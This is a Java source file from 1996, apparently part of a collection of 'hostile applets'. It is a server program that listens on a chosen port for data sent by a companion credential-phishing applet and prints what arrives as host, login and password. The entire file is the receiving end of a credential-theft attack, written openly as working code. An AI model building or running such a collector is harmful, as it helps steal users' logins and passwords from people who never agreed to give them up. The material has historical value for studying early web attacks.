package hostile;

/* LoginServerSocket.java by Mark D. LaDue */

/* February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This Java Application sets up a simple ServerSocket to receive
     data from the Java applet Ungrateful.java */

import java.applet.Applet;
import java.awt.*;
import java.io.*;
import java.net.*;

class LoginServerSocket {

    public static void main(String args[]) {

        ServerSocket server;
        Socket sock;
        InputStream inStream;
//      OutputStream outStream;
        String home = new String("www.math.gatech.edu");
        int port = 7000;
        byte b[] = new byte[128];
        int numbytes;
        String reply;

        if (args.length != 1) {
            System.out.println("Command: java LoginServerSocket <port number>");
            return;
        }

        System.out.println("LoginServerSocket Session Starting");

        port = Integer.parseInt(args[0]);

//    Create the ServerSocket
        try {
            server = new ServerSocket(port);
            }
        catch (IOException ioe) {
            System.out.println("Unable to open port " + port);
            return;
        }

//  Listen for anyone logging in to the applet
        while (true) {
            try {
                sock = server.accept();
                inStream = sock.getInputStream();
            }
            catch (IOException ioe) {
                System.out.println("Accept failed at port " + port);
                return;
            }
            try {
                numbytes = inStream.read(b, 0, 128);
            }
            catch (IOException ioe) {
                System.out.println("Read failed at port " + port);
                return;
            }
            reply = new String(b, 0, 0, numbytes);
            System.out.println("Host Name / IP Address \t" + 
                               "Login \t" + "Password");
            System.out.println(reply);

//  We could send a message back, but we won't right now
            try {
                sock.close();
            }
            catch (IOException ioe) {
                 System.out.println("Unable to close port " + port);
            }
        }
    }
}


